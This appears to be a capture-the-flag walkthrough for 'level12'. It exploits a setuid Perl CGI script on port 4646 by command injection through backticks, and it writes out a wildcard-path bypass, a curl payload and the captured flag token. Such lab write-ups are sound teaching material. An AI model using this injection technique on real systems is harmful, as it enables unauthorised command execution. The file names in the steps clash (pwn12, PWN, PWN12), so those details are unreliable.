# level12

- We log as 'level12'

- A single file is located inside the home directory of level12:
>`-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl`

- The executable file has setuid & setgid bits permissions

- This is a perl script:
```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

- We can see it is a CGI for a service running on the port 4646

- The CGI takes two arguments `x` and `y`, pass them through the `t` function and pass the return value of `t` is passed through the `n` function
>`n(t(param("x"), param("y")));`

- The `t` function parses the arguments by uppercasing all letters and by removing everything after the first whitespace
>`$xx =~ tr/a-z/A-Z/; `
>`$xx =~ s/\s.*//;`

- We can see `$xx` is then inserted into a string and this string is executed as a bash command, this will allow us to execute arbitrary code
```perl
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```

- We need to execute the `getflag` command but every input will be uppercased so we can't write `getflag` directly

- The `egrep` function finds every occurence of `^$xx` inside /tmp/xd and all errors are displayed on stdout

- Let's create a `/tmp/PWN12` file:
>`echo "getflag /tmp/pwned12" > /tmp/pwn12`
>`chmod 777 /tmp/PWN`

- By passing a string into back quotes as argument we will execute it as shell code so we will pass the script as arguments but our input must not contain any lowecase letters so we will use a wildcard:
```perl
`/*/PWN12`
```

- Let's send this to the service:
```bash
curl "http://localhost:4646/?x=\`/*/PWN12\`"
```

- We `cat` the result:
>`cat /tmp/pwned12`
>`Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr`

- We get the flag: `g1qKMiRpXf53AWhDaU7FEkczr`